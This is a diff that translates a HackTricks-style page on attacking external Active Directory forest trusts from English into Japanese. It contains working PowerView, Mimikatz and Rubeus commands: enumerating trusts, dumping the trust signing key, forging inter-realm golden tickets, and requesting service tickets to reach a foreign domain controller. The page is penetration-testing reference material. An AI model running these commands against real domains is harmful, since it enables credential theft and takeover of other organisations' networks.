@@ -1,13 +1,12 @@
-# External Forest Domain - OneWay (Inbound) or bidirectional
+# 外部フォレストドメイン - 一方向（インバウンド）または双方向
 
 {{#include ../../banners/hacktricks-training.md}}
 
-In this scenario an external domain is trusting you (or both are trusting each other), so you can get some kind of access over it.
+このシナリオでは、外部ドメインがあなたを信頼している（または両方が互いに信頼している）ため、何らかのアクセスを得ることができます。
 
-## Enumeration
+## 列挙
 
-First of all, you need to **enumerate** the **trust**:
-
+まず最初に、**信頼**を**列挙**する必要があります：
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -32,7 +31,7 @@ GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
 MemberDomain            : domain.external
 MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
 MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
-                          DC=external
+DC=external
 
 # Get name of the principal in the current domain member of the cross-domain group
 ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
@@ -57,48 +56,42 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
+前の列挙で、ユーザー **`crossuser`** が **`External Admins`** グループに属しており、**外部ドメインのDC内で管理者アクセス**を持っていることがわかりました。
 
-In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
+## 初期アクセス
 
-## Initial Access
+他のドメインでユーザーの**特別な**アクセスを見つけられなかった場合でも、ADメソッドに戻り、**特権のないユーザーからのプライベートエスカレーション**を試みることができます（例えば、kerberoastingなど）：
 
-If you **couldn't** find any **special** access of your user in the other domain, you can still go back to the AD Methodology and try to **privesc from an unprivileged user** (things like kerberoasting for example):
-
-You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
-
+**Powerview関数**を使用して、`-Domain`パラメータを使って**他のドメイン**を**列挙**できます。
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
-
 {{#ref}}
 ./
 {{#endref}}
 
-## Impersonation
+## なりすまし
 
-### Logging in
+### ログイン
 
-Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:
-
+外部ドメインにアクセス権を持つユーザーの資格情報を使用して、通常の方法でアクセスできるはずです:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
+### SID履歴の悪用
 
-### SID History Abuse
+フォレストトラストを通じて[**SID履歴**](sid-history-injection.md)を悪用することもできます。
 
-You could also abuse [**SID History**](sid-history-injection.md) across a forest trust.
-
-If a user is migrated **from one forest to another** and **SID Filtering is not enabled**, it becomes possible to **add a SID from the other forest**, and this **SID** will be **added** to the **user's token** when authenticating **across the trust**.
+ユーザーが**あるフォレストから別のフォレストに移行され**、**SIDフィルタリングが有効でない**場合、**他のフォレストからSIDを追加する**ことが可能になり、この**SID**は**トラストを通じて認証する際にユーザーのトークンに追加されます**。
 
 > [!WARNING]
-> As a reminder, you can get the signing key with
+> リマインダーとして、署名キーを取得するには
 >
 > ```powershell
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-You could **sign with** the **trusted** key a **TGT impersonating** the user of the current domain.
-
+現在のドメインのユーザーを**偽装する**TGTを**信頼された**キーで**署名する**ことができます。
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -109,9 +102,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
-### Full way impersonating the user
-
+### ユーザーを完全に偽装する方法
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -125,6 +116,4 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
-
